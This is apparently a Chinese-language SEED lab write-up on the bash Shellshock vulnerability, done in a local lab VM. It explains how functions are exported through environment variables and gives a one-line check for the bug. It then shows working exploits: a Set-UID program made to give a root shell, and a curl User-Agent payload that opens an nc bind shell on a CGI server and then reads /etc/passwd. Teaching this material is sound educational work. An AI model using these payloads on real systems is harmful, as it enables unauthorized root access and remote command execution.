## Shellshock Attack

## 概述

## 认识环境变量&&bash

1. 普通shell变量和bash
```
[04/12/2018 09:26] seed@ubuntu:~/Seed/shellshock$ gu="hacker"
[04/12/2018 09:26] seed@ubuntu:~/Seed/shellshock$ echo $gu
hacker
[04/12/2018 09:26] seed@ubuntu:~/Seed/shellshock$ bash
[04/12/2018 09:27] seed@ubuntu:~/Seed/shellshock$ echo $gu

[04/12/2018 09:27] seed@ubuntu:~/Seed/shellshock$ exit
exit
[04/12/2018 09:27] seed@ubuntu:~/Seed/shellshock$ 
```
从上述实验中我们得出结论:bash子进程没有继承普通shell变量gu.  

2. 普通环境变量和bash
```
[04/12/2018 09:31] seed@ubuntu:~/Seed/shellshock$ echo $gu
hacker
[04/12/2018 09:32] seed@ubuntu:~/Seed/shellshock$ export gu
[04/12/2018 09:32] seed@ubuntu:~/Seed/shellshock$ bash
[04/12/2018 09:32] seed@ubuntu:~/Seed/shellshock$ echo $gu
hacker
[04/12/2018 09:32] seed@ubuntu:~/Seed/shellshock$ exit
exit
[04/12/2018 09:32] seed@ubuntu:~/Seed/shellshock$
```
从上述实验中我们得出结论:bash子进程继承环境变量gu.  

3. 函数shell变量和bash
```
[04/12/2018 09:37] seed@ubuntu:~/Seed/shellshock$ gu() { echo "gu is a hacker";}
[04/12/2018 09:37] seed@ubuntu:~/Seed/shellshock$ gu
gu is a hacker
[04/12/2018 09:38] seed@ubuntu:~/Seed/shellshock$ bash
[04/12/2018 09:38] seed@ubuntu:~/Seed/shellshock$ gu
gu: command not found
[04/12/2018 09:38] seed@ubuntu:~/Seed/shellshock$ exit
exit
[04/12/2018 09:38] seed@ubuntu:~/Seed/shellshock$
```
从上述实验中我们得出结论:bash子进程没有继承函数shell变量gu.  

4. 函数环境变量和bash
```
[04/12/2018 09:41] seed@ubuntu:~/Seed/shellshock$ gu
gu is a hacker
[04/12/2018 09:41] seed@ubuntu:~/Seed/shellshock$ export -f gu
[04/12/2018 09:41] seed@ubuntu:~/Seed/shellshock$ bash
[04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$ gu
gu is a hacker
[04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$ exit
exit
[04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$ env | grep gu
gu=hacker
gu=() {  echo "gu is a hacker"
[04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$ 
```
从上述实验中我们得出结论:bash子进程继承了函数环境变量gu.  

5. 再探普通环境变量和bash
```
[04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$ ailx10='() {  echo "ailx10 is a hacker";}'
[04/12/2018 09:48] seed@ubuntu:~/Seed/shellshock$ export -nf gu
[04/12/2018 09:48] seed@ubuntu:~/Seed/shellshock$ export -n gu
[04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ export -f ailx10
bash: export: ailx10: not a function
[04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ export ailx10
[04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ bash
[04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$ ailx10
ailx10 is a hacker
[04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$ env | grep ailx10
ailx10=() {  echo "ailx10 is a hacker"
[04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$ exit
exit
[04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$ env | grep ailx10
ailx10=() {  echo "ailx10 is a hacker";}
[04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$ 
```
从上述实验中我们得出结论:bash子进程误把普通环境变量`(){ :; }`当做函数环境变量处理了.  

6. `() { :;}`再探
```
[04/12/2018 09:57] seed@ubuntu:~/Seed/shellshock$ ailx10='() { :; };/bin/ls'
[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ export ailx10
[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ bash
curl-7.20.0	    myls	  myls.c      myprog.cgi.1  readme.txt
curl-7.20.0.tar.gz  myls-notroot  myprog.cgi  myprog.cgi.2
[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ exit
exit
[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ 

```

从上述实验中我们得出结论:bash子进程处理了`/bin/ls`.  

**综上所述触发bash漏洞可以归纳如下**
1. 产生新的bash
2. 通过环境变量传递
3. 环境变量以`() {}`这样的形式

如何用一条语句验证bash漏洞?
```
[04/12/2018 10:14] seed@ubuntu:~/Seed/shellshock$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
vulnerable
this is a test
[04/12/2018 10:14] seed@ubuntu:~/Seed/shellshock$ 
[04/12/2018 10:14] seed@ubuntu:~/Seed/shellshock$ 
[04/12/2018 10:14] seed@ubuntu:~/Seed/shellshock$ env x='() { :;}; echo vulnerable' bash -c :
vulnerable
[04/12/2018 10:14] seed@ubuntu:~/Seed/shellshock$
```

**注意:**
`:`什么都不做,在这里和true等价
```
$ if true; then echo yes; fi
yes
$ if :; then echo yes; fi
yes
$
```
`env`可以创建临时环境变量.  
`bash -c`可以运行一个shell命令.  
```
$ bash -c 'echo hi'
hi
$ bash -c 'echo $t'

$ env t=exported bash -c 'echo $t'
exported
$
```

## 攻击Set-UID程序

将sh软链接到我们有漏洞的bash:`sudo ln -sf /bin/bash /bin/sh `  

看一个简单的c程序,功能等同与shell命令`ls`:
```c
#include <stdio.h>
void main()
{
    setuid(geteuid()); // make real uid = effective uid.
    system("/bin/ls -l");
}
```
1. 导入我们的环境变量
` export gu='() { :;};/bin/sh'`
2. 编译运行上面的小程序
设置Set-UID和不设置Set-UID的运行结果如下:

```

[04/12/2018 10:36] seed@ubuntu:~/Seed/shellshock$ export gu='() { :;};/bin/sh'
[04/12/2018 10:36] seed@ubuntu:~/Seed/shellshock$ ./myls
sh-4.2#
sh-4.2# whoami
root
sh-4.2# pwd
/home/seed/Seed/shellshock
sh-4.2# ls
curl-7.20.0	    myls	  myls.c      myprog.cgi.1  readme.txt
curl-7.20.0.tar.gz  myls-notroot  myprog.cgi  myprog.cgi.2
sh-4.2#
sh-4.2#
sh-4.2# exit
exit
[04/12/2018 10:37] seed@ubuntu:~/Seed/shellshock$ ./myls-notroot 
sh-4.2$ 
sh-4.2$ whoami
seed
sh-4.2$ exit
exit
[04/12/2018 10:38] seed@ubuntu:~/Seed/shellshock$ 

```
通过实验结果我们可以得出结论:我们获得了一个root shell和一个普通shell.  

## 攻击CGI程序

1. 创建CGI程序
创建myprog.cgi,将文件放入`/usr/lib/cgi-bin/`目录中,设置可执行权限755,  
开启apache.通过浏览器访问`127.0.0.1/cgi-bin/myprog.cgi`试一试.  
再试一试`curl http://127.0.0.1/cgi-bin/myprog.cgi`.  

```
#!/bin/bash
echo "Content-type: text/plain"
echo
echo
echo "Hello World"
```
2. 获取网站控制权限

虚拟机的IP地址:192.168.59.142/24
主机的IP地址:192.168.59.1/24

**触发网站的shellshock:**
`curl -A "() { :;};echo; /bin/nc -lp 10086 -c bash" http://192.168.59.142/cgi-bin/myprog.cgi`


**黑客的主机控制了肉鸡:**

```
root@gt:/home/git/Keep-learning/mySeedLab# nc 192.168.59.142 10086
whoami
www-data
pwd
/usr/lib/cgi-bin
ls
my2.cgi
myprog.cgi
php
php5
cat /etc/passwd
...
hacker:x:1002:1003::/home/hacker:/bin/sh
gu:x:1001:1004::/home/gu:/bin/sh

```

注意:
1. 主机和虚拟机能够互相Ping通
2. 主机可以通过浏览器访问虚拟机中的网站
3. nc使用netcat-traditional替换netcat-openbsd
4. 更多Linux shell命令可以订阅我的专栏`ath0的Linux笔记`
